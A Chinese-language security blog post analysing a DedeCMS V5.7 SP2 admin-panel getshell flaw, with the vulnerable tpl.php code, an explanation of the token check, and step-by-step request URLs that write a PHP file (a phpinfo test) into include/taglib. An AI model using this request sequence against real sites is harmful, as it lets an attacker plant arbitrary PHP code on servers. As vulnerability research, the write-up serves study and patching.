<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>DedeCMS V5.7 SP2后台Getshell 代码执行漏洞(每日一洞) - F0rmat&#39;Blog</title>
<link rel="stylesheet" type="text/css" href="/css/main.css">
</head>
<body>
<header>
  <div>
    <h1><a href="https://getshe11.com/">F0rmat&#39;Blog</a></h1>
  </div>
  <nav></nav>
</header>
<main>
  <article>
    <div class="title">
  <h1>DedeCMS V5.7 SP2后台Getshell 代码执行漏洞(每日一洞)</h1>
  </div>
<div style="position: fixed; right:-30px; max-width:300px; overflow:auto; top: 1px; width: 300px; bottom:100px">

</div>
<div class="meta">
  <div>2018-03-10 00:11</div>
  <div>
    <span><a href="https://getshe11.com/tags/php/">#php</a></span>
      <span><a href="https://getshe11.com/tags/dedecms/">#DedeCMS</a></span>
      <span><a href="https://getshe11.com/tags/getshell/">#getshell</a></span>
      </div>
  </div>
<div class="content">
  <h1 id="前言">前言</h1>
<pre><code>这两天费劲脑力去撩小姐姐，感觉好难啊，还不如审计代码。
</code></pre>
<h1 id="环境">环境</h1>
<p><strong>Web：</strong> phpstudy
<strong>System：</strong> Windows 10 X64
<strong>Browser：</strong> Firefox Quantum
<strong>Python version ：</strong> 2.7
<strong>Tools：</strong> PhpStorm 2017.1.1</p>
<!-- raw HTML omitted -->
<h1 id="复现">复现</h1>
<h2 id="漏洞利用">漏洞利用</h2>
<ol>
<li>首先访问域名 + /dede/tpl.php?action=upload，在这个页面的源代码中获取到token值。
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/dedecms1.png" alt=""></li>
<li>访问以下地址：
<code>域名 + /dede/tpl.php?filename=shell.lib.php&amp;action=savetagfile&amp;content=&lt;?php%20phpinfo();?&gt;&amp;token=刚才的token值</code>
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/dedecms.gif" alt=""></li>
<li>访问shell的地址：</li>
</ol>
<p><code>域名 + /include/taglib/shell.lib.php</code></p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/dedecms2.png" alt=""></p>
<h1 id="漏洞分析">漏洞分析</h1>
<h2 id="代码位置和代码">代码位置和代码</h2>
<p><strong>位置：</strong>
<code>dedecms\dede\tpl.php</code>
<strong>代码：</strong></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">if</span>(<span style="color:#66d9ef">empty</span>($filename))    $filename <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
$filename <span style="color:#f92672">=</span> <span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#34;#[\/</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">]#&#34;</span>, <span style="color:#e6db74">&#39;&#39;</span>, $filename); 

<span style="color:#a6e22e">中间省略。。。。。。。。。</span>

<span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>($action<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;savetagfile&#39;</span>)
{
    <span style="color:#a6e22e">csrf_check</span>();
    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;#^[a-z0-9_-]{1,}\.lib\.php$#i&#34;</span>, $filename))
    {
        <span style="color:#a6e22e">ShowMsg</span>(<span style="color:#e6db74">&#39;文件名不合法，不允许进行操作！&#39;</span>, <span style="color:#e6db74">&#39;-1&#39;</span>);
        <span style="color:#66d9ef">exit</span>();
    }
    <span style="color:#66d9ef">require_once</span>(<span style="color:#a6e22e">DEDEINC</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#39;/oxwindow.class.php&#39;</span>);
    $tagname <span style="color:#f92672">=</span> <span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#34;#\.lib\.php$#i&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>, $filename);
    $content <span style="color:#f92672">=</span> <span style="color:#a6e22e">stripslashes</span>($content);
    $truefile <span style="color:#f92672">=</span> <span style="color:#a6e22e">DEDEINC</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#39;/taglib/&#39;</span><span style="color:#f92672">.</span>$filename;
    $fp <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>($truefile, <span style="color:#e6db74">&#39;w&#39;</span>);
    <span style="color:#a6e22e">fwrite</span>($fp, $content);
    <span style="color:#a6e22e">fclose</span>($fp);
</code></pre></div><h2 id="分析过程">分析过程</h2>
<ul>
<li>由于dedecms全局变量注册的特性，所以这里的大部分变量都是可控的。
这里有个一个函数<code>preg_replace</code>，是把匹配到的字符替换为空，我们的文件名没有包含类似<code>/</code>,<code>\</code>所以不用理会。</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-PHP" data-lang="PHP"><span style="color:#66d9ef">if</span>(<span style="color:#66d9ef">empty</span>($filename))    $filename <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
$filename <span style="color:#f92672">=</span> <span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#34;#[\/</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">]#&#34;</span>, <span style="color:#e6db74">&#39;&#39;</span>, $filename); 
</code></pre></div><ul>
<li>等下要传值一个<code>savetagfile</code>才能进行下面的语句。
这里有一个<code>csrf_check()</code>的函数，可以看到这里是验证<code>token</code>的位置，待会我们也要把<code>token</code>带进去。
我们还是直接看<code> $content = stripslashes($content);$truefile = DEDEINC.'/taglib/'.$filename;</code>这两句，要写入的<code>$content</code>是经过<code>stripslashes</code>函数的过滤，只要我们要写入的php语句不包含反斜杠就行了。然后<code>$truefile</code>这个就是等会要写入文件的文件流了，还包含了写入的路径。</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>($action<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;savetagfile&#39;</span>)
{
    <span style="color:#a6e22e">csrf_check</span>();
    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;#^[a-z0-9_-]{1,}\.lib\.php$#i&#34;</span>, $filename))
    {
        <span style="color:#a6e22e">ShowMsg</span>(<span style="color:#e6db74">&#39;文件名不合法，不允许进行操作！&#39;</span>, <span style="color:#e6db74">&#39;-1&#39;</span>);
        <span style="color:#66d9ef">exit</span>();
    }
    <span style="color:#66d9ef">require_once</span>(<span style="color:#a6e22e">DEDEINC</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#39;/oxwindow.class.php&#39;</span>);
    $tagname <span style="color:#f92672">=</span> <span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#34;#\.lib\.php$#i&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>, $filename);
    $content <span style="color:#f92672">=</span> <span style="color:#a6e22e">stripslashes</span>($content);
    $truefile <span style="color:#f92672">=</span> <span style="color:#a6e22e">DEDEINC</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#39;/taglib/&#39;</span><span style="color:#f92672">.</span>$filename;
    $fp <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>($truefile, <span style="color:#e6db74">&#39;w&#39;</span>);
    <span style="color:#a6e22e">fwrite</span>($fp, $content);
    <span style="color:#a6e22e">fclose</span>($fp);
</code></pre></div><p><code>\dede\config.php</code></p>
<pre><code>function csrf_check()
{
    global $token;

    if(!isset($token) || strcasecmp($token, $_SESSION['token']) != 0){
        echo '&lt;a href=&quot;http://bbs.dedecms.com/907721.html&quot;&gt;DedeCMS:CSRF Token Check Failed!&lt;/a&gt;';
        exit;
    }
}

</code></pre><h2 id="构造poc">构造POC</h2>
<p>有人说没有后台还是一样没卵用，可以看下先知的一篇找后台地址的文章：https://xianzhi.aliyun.com/forum/topic/2064</p>
<p>刚才上面分析了需要的传入的参数有：<code>filename</code>,<code>action</code>,<code>content</code>,<code>token</code>。
<code>token</code>上面复现的时候已经说过怎么获取这个值了，
最终的构造：
<code>http://dedecms.test/dede/tpl.php?filename=文件名字.lib.php&amp;action=savetagfile&amp;content=文件内容&amp;token=获取到的token</code></p>
<h1 id="结束">结束</h1>
<p>这个也不写python脚本了，因为要用到后台也很难实现批量化。</p>
<p>已经两天没有发文章了，一定要坚持下去，比你牛逼的人还比你努力是一种什么体验？</p>
<h1 id="参考">参考</h1>
<p><a href="http://www.freebuf.com/vuls/164035.html">http://www.freebuf.com/vuls/164035.html</a></p>
<p>源码下载：https://pan.lanzou.com/i0mmfih</p>
</div>
<div style="position: fixed; right:50px; max-width:255px; overflow:auto; top: 120px; width: 220px; bottom:90px">










<div class="toc">

    <div class="page-header"><strong>目录</strong></div>

    <div id="page-scrollspy" class="toc-nav">

        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#%e5%89%8d%e8%a8%80">
                            前言
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#%e7%8e%af%e5%a2%83">
                            环境
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#%e5%a4%8d%e7%8e%b0">
                            复现
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8">
                            漏洞利用
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90">
                            漏洞分析
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#%e4%bb%a3%e7%a0%81%e4%bd%8d%e7%bd%ae%e5%92%8c%e4%bb%a3%e7%a0%81">
                            代码位置和代码
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#%e5%88%86%e6%9e%90%e8%bf%87%e7%a8%8b">
                            分析过程
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#%e6%9e%84%e9%80%a0poc">
                            构造POC
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#%e7%bb%93%e6%9d%9f">
                            结束
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#%e5%8f%82%e8%80%83">
                            参考
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        

    </div>

</div>



</div>

  </article>
</main>
<footer>
  <div>
    <div>&copy; 2021 F0rmat. <a href="https://creativecommons.org/licenses/by/4.0/deed.zh">CC-BY-4.0</a></div>
  </div>
</footer>
</body>
</html>
